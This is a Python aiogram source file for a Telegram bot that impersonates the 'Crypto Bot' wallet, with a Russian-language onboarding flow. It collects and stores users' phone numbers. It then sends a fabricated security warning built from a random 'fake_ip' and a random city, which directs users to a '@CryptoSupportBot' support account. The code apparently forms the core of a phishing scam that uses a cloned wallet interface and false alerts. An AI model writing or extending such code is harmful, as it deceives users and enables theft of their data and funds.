# main.py
import asyncio
import logging
import os
import random
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, 
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, 
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

import config
from config import BOT_TOKEN, _e
from database import init_db, create_user, get_user, save_phone
from keyboards import main_menu_inline

import wallet
import p2p
import more
import admin
import business
import notifications
import limits
import currency
import menu_stubs
import settings_actions
import extra_menus
import exchange

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Подключаем роутеры
dp.include_router(extra_menus.router)
dp.include_router(exchange.router)
dp.include_router(admin.router)
dp.include_router(wallet.router)
dp.include_router(p2p.router)
dp.include_router(notifications.router)
dp.include_router(limits.router)
dp.include_router(currency.router)
dp.include_router(more.router)
dp.include_router(settings_actions.router)
dp.include_router(menu_stubs.router)
dp.include_router(business.router)

class Onboarding(StatesGroup):
    waiting_start = State()
    waiting_contact = State()

def get_start_text() -> str:
    crypto_icon = _e("crypto", "💼")
    leaf = _e("leaf", "🍂")
    
    # БЕЗ ССЫЛОК НА TELEGRAM-КАНАЛЫ
    return (
        f"{crypto_icon} <b>Мультивалютный криптокошелёк</b>. "
        "Покупайте, продавайте, храните, "
        "отправляйте криптовалюту и платите ею, когда хотите.\n\n"
        "Подписывайтесь на наш канал "
        "и вступайте в наш чат.\n\n"
        f"{leaf} Осенний фестиваль с {crypto_icon} Crypto Bot! "
        "Получить баллы ›"
    )

@dp.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    if msg.text and "check_" in msg.text:
        await more.activate_check_link(msg, state)
        return

    if msg.text and "invoice_" in msg.text:
        await extra_menus.show_invoice_card(msg, state)
        return

    await create_user(msg.from_user.id, msg.from_user.username or "")
    user = await get_user(msg.from_user.id)

    if user and user["is_onboarded"]:
        img_path = os.path.join(BASE_DIR, "start_banner.jpg")
        kb = main_menu_inline()
        text = get_start_text()
        if os.path.exists(img_path):
            await msg.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
        else:
            await msg.answer(text, reply_markup=kb, parse_mode="HTML", disable_web_page_preview=True)
        return

    img_path = os.path.join(BASE_DIR, "welcome.jpg")
    text = (
        '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
        "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Начать", callback_data="onb:start")]
    ])
    
    if os.path.exists(img_path):
        await msg.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML")
    else:
        await msg.answer(text, reply_markup=kb, parse_mode="HTML")
    
    await state.set_state(Onboarding.waiting_start)

@dp.callback_query(Onboarding.waiting_start, F.data == "onb:start")
async def onb_start(cb: CallbackQuery, state: FSMContext):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Поделиться номером", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await cb.message.answer("Подтвердите номер телефона, нажав на кнопку ниже.", reply_markup=kb)
    await state.set_state(Onboarding.waiting_contact)
    await cb.answer()

@dp.message(Onboarding.waiting_contact, F.contact)
async def onb_contact(msg: Message, state: FSMContext):
    contact = msg.contact
    if contact.user_id != msg.from_user.id:
        await msg.answer("Пожалуйста, отправьте свой собственный номер.")
        return

    await save_phone(msg.from_user.id, contact.phone_number)
    await msg.answer("✅ Вы успешно подтвердили номер телефона.", reply_markup=ReplyKeyboardRemove())
    
    fake_ip = f"31.59.{random.randint(100, 200)}.{random.randint(10, 99)}"
    fake_city = random.choice(["Warsaw, Poland", "Berlin, Germany", "London, UK", "Paris, France"])
    
    text_security = (
        f"⚠️ Вы создали код-пароль\n\n"
        f"IP-адрес: <code>{fake_ip}</code>\n"
        f"Локация: {fake_city}\n\n"
        f"Если это были не вы, напишите в поддержку – @CryptoSupportBot."
    )
    await msg.answer(text_security, parse_mode="HTML")
    
    text_final = (
        'Настройка аккаунта успешно завершена. Теперь вы можете использовать '
        'все возможности <tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> Crypto Bot.'
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Начать", callback_data="menu:main")]
    ])
    await msg.answer(text_final, reply_markup=kb, parse_mode="HTML")
    await state.clear()

@dp.callback_query(F.data == "menu:main")
async def cb_main_menu(cb: CallbackQuery):
    img_path = os.path.join(BASE_DIR, "start_banner.jpg")
    text = get_start_text()
    try: await cb.message.delete()
    except: pass
    
    if os.path.exists(img_path):
        await cb.message.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=main_menu_inline(), parse_mode="HTML", disable_web_page_preview=True)
    else:
        await cb.message.answer(text, reply_markup=main_menu_inline(), parse_mode="HTML", disable_web_page_preview=True)
    await cb.answer()

# --- ОБРАБОТЧИКИ КОМАНД ДЛЯ СИНЕГО МЕНЮ ---

@dp.message(Command("wallet"))
async def cmd_wallet(msg: Message):
    await wallet.show_wallet(msg, msg.from_user.id, edit=False)

@dp.message(Command("p2p"))
async def cmd_p2p(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:p2p")
    await p2p.cb_p2p_menu(fake_cb)

@dp.message(Command("checks"))
async def cmd_checks(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:checks")
    await more.cb_checks(fake_cb)

@dp.message(Command("invoices"))
async def cmd_invoices(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:invoices")
    await extra_menus.cb_invoices(fake_cb)

@dp.message(Command("giveaways"))
async def cmd_giveaways(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:giveaways")
    await extra_menus.cb_giveaways(fake_cb)

@dp.message(Command("subscriptions"))
async def cmd_subscriptions(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:subs")
    await extra_menus.cb_subs(fake_cb)

@dp.message(Command("pay"))
async def cmd_pay(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:pay")
    await more.cb_crypto_pay(fake_cb)

@dp.message(Command("settings"))
async def cmd_settings(msg: Message):
    fake_cb = CallbackQuery(id="fake", from_user=msg.from_user, chat_instance="fake", message=msg, data="menu:settings")
    await menu_stubs.cb_menu_settings(fake_cb)

from keep_alive import start_health_server

async def main():
    port = start_health_server()
    log.info(f"Healthcheck сервер активен на порту {port}")
    await init_db()
    me = await bot.get_me()
    config.BOT_USERNAME = me.username
    log.info(f"Бот запущен: @{me.username}")
    
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())